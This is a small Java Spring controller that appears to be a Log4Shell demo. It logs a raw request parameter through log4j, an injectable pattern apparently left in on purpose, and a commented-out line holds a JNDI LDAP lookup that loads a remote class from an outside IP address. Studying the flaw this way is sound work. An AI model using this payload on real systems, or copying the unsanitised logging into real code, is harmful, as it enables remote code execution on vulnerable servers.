package com.example.kinglog;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


@RestController
public class HomeController {

    private static final Logger logger = LogManager.getLogger(HomeController.class);

    @RequestMapping("/")
    public String home(String test) {
        logger.info("Home! " + test);
//        logger.error("Home Error! " + test);
//        logger.error("${jndi:ldap://125.133.70.78:8080/HelloWorld.class}");

        return "Home";
    }

    @RequestMapping("/test")
    public String test() {
        logger.info("TEST 호출!!");
        return "TEST CALL";
    }
}
